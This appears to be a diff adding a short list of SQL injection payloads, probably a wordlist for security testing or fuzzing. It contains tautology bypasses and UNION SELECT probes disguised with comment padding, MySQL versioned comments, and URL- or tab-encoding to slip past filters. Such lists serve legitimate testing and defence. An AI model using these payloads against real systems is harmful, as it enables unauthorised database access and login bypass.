@@ -1,0 +1,9 @@
+' OR/**/1=1--
+'/*comment*/OR/*comment*/1=1--
+' /*!OR*/ /*!1*/=/*!1*/--
+1 /*!UNION*/ /*!SELECT*/ NULL--
+1 UNION/*!SELECT*/ NULL--
+' OR '1'%3D'1
+'+UNION+SELECT+NULL--
+'/**/UNION/**/SELECT/**/NULL--
+'%09UNION%09SELECT%09NULL--
